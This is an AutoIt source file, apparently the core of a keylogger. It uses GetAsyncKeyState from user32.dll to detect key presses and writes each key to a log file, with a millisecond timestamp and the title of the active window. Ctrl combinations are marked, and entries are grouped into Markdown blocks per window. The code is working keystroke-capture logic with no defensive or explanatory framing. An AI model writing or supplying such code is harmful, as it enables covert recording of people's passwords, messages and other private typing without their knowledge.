Func _isKeyPressed( $sKeyHexCode )
    Local $aReturn = DllCall( 'user32.dll', 'short', 'GetAsyncKeyState', 'int', '0x' & $sKeyHexCode )
    Return BitAND( $aReturn[0], 0x8000 ) <> 0
EndFunc

;~ Second variant:
;~ Func _isKeyPressed2( $sKeyHexCode )
;~     Local $aReturn = DllCall( 'user32.dll', 'short', 'GetKeyState', 'int', '0x' & $sKeyHexCode )
;~     Return $aReturn[0] < -126
;~ EndFunc

Func _isKeyReleased( $sKeyHexCode )
    If _isKeyPressed( $sKeyHexCode ) Then
        While _isKeyPressed( $sKeyHexCode )
            Sleep( 10 )
        WEnd

        Return True
    EndIf

    Return False
EndFunc

Func _wasKeyPressed( $sKeyHexCode )
    Return _isKeyReleased( $sKeyHexCode )
EndFunc

Func _hasWindowChanged( $sWindow )
    If $sWindow == $sCurrentWindow Then Return False
    $sCurrentWindow = $sWindow
    Return True
EndFunc

Func _wasKeyOfKeyTypePressed( $aKeyType, $iMode = 0 )
    For $i = 0 To UBound( $aKeyType ) - 1 Step 1
        Local $sKeyHexCode = $aKeyType[$i][0]
        Local $sKey        = $aKeyType[$i][1]

        If _wasKeyPressed( $sKeyHexCode ) Then
            Local $sTimestamp   = @YEAR & '-' & @MON & '-' & @MDAY & ' ' & @HOUR & ':' & @MIN & ':' & @SEC & '.' & @MSEC
            Local $sActivWindow = WinGetTitle( '[ACTIVE]' )
            Local $sBlockEnd    = @CRLF & '```' & @CRLF & @CRLF
            Local $sBlockStart  = @CRLF & @CRLF & '```' & @CRLF
            Local $sTextBlock   = $sBlockEnd & '##### **' & $sTimestamp & '**' & @CRLF & '###### &raquo; ' & $sActivWindow & $sBlockStart

            ; Enter
            If $sKeyHexCode == '0D' Then FileWrite( $hLogFile, @CRLF )

            Switch $iMode
                Case 1
                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                    FileWrite( $hLogFile, StringUpper( $sKey ) )
                Case 2
                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                    FileWrite( $hLogFile, '[Ctrl]+[' & $sKey & ']')
                Case Else
                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                    FileWrite( $hLogFile, $sKey )
            EndSwitch
        EndIf
    Next
EndFunc
